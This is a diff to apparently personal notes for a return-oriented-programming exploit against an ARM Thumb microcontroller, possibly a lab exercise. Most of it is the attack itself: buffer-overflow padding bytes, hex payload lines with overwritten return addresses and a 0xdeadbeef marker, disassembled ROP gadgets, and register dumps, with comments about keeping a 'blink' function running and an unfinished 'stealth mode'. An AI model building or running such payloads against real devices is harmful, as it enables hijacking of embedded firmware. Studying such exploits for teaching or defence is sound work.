@@ -112,10 +112,62 @@ bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
 bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
 bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
 bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
-32 81 D5 23 80 00 00 00 90	02	00	08	c8	07	00	10
-dc	07	00	10 00 00 00 00 4b 03 00 08  
+32 81 D5 23 80 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 4b 03 00 08  
 
-32	81	d5	23	80	00	00	00 90	02	00	08	c8	07	00	10
-dc	07	00	10	00	00	00	00
 
-now only missing to continue task
+
+
+Registers in default:
+0xff	0xff	0xff	0xff	0xff	0xff	0xff	0xff
+0x32	0x81	0xd5	0x23	0x80	0x00	0x00	0x00
+0x90	0x02	0x00	0x08	0xc8	0x07	0x00	0x10
+0xdc	0x07	0x00	0x10	0x00	0x00	0x00	0x00
+
+
+
+
+8003d02:	2000      	movs	r0, #0
+8003d04:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}
+
+08000b10 <gadget3>:
+  .size gadget2,.-gadget2
+
+.thumb_func
+gadget3:
+  .fnstart
+  STR r4, [r3]
+ 8000b10:	601c      	str	r4, [r3, #0]
+  POP {pc}
+ 8000b12:	bd00      	pop	{pc}
+
+
+
+08000b0c <gadget2>:
+.syntax unified
+.text
+.thumb_func
+gadget2:
+  .fnstart
+  SUB sp, #32
+ 8000b0c:	b088      	sub	sp, #32
+  POP {pc}
+ 8000b0e:	bd00      	pop	{pc}
+
+
+
+ copy registers and add 0xdeadbeed as return parameter of blink function, in order to provide continuos working
+
+ bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd 
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+32 81 d5 23 80 00 00 00 90 02 00 08 c8 07 00 10
+dc 07 00 10 00 00 00 00 4b 03 00 08 ef be ad de
+
+
+I was not able to implement the stealth mode :( please contribute!
